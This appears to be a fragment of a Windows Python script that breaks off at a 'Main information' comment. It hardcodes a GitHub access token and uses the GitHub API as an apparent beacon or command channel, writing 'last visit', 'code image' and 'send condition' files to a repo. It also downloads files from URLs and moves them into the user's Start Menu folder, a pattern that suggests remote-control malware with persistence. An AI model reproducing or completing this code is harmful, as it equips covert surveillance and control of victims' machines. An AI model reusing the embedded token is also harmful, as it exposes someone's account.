from datetime import datetime
from os import  fsync, listdir, environ , path , system , mkdir , walk , chdir , getcwd
from shutil import move , copy
from time import sleep
from github import Github
import base64
import pathlib
import subprocess
import git
import pyautogui
import requests
import json
import win32api
import zipfile
# _____(end import)_____ #
TOKEN = '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'
chdir(getcwd())
# _____(function)_____ #
try:
    def download(url: str, dest_folder: str):
        response = requests.get(url, stream=True)
        if response.ok:
            filename = url.split('/')[-1].replace(" ", "_")
            file_path = path.join(dest_folder, filename)
            with open(file_path, 'wb') as f:
                for chunk in response.iter_content(chunk_size=1024 * 8):
                    if chunk:
                        f.write(chunk), f.flush(), fsync(f.fileno())
        else:
            pass


    def move_file(path):
        path = environ['APPDATA'] + fr"\Microsoft\Windows\Start Menu\Programs{path}"
        try:
            for i in (listdir("software")):
                move(fr"software\{i}", path)
        except:
            pass

    #__________(last visit)__________#
    def last_visit(TOKEN):
        time = datetime.now()
        with open(file="last_visit.ini", mode="w") as f:
            f.write(f"{time}")
        g = Github(TOKEN)
        repo = g.get_user().get_repo("python")
        file = repo.get_dir_contents("last_visit.ini")
        repo.update_file("last_visit.ini", "visit", f"{time}", sha=file.sha)


    def code_image(TOKEN):
        with open(file="code_image.ini", mode="r") as f:
            g = Github(TOKEN)
            repo = g.get_user().get_repo("python")
            file = repo.get_dir_contents("code_image.ini")
            repo.update_file("code_image.ini", "image", f"{f.read()}", sha=file.sha)


    def send_condition(TOKEN):
        g = Github(TOKEN)
        repo = g.get_user().get_repo("python")
        file = repo.get_dir_contents("send_condition.ini")
        repo.update_file("send_condition.ini", "condition", "True", sha=file.sha)

# __________(Main information)__________#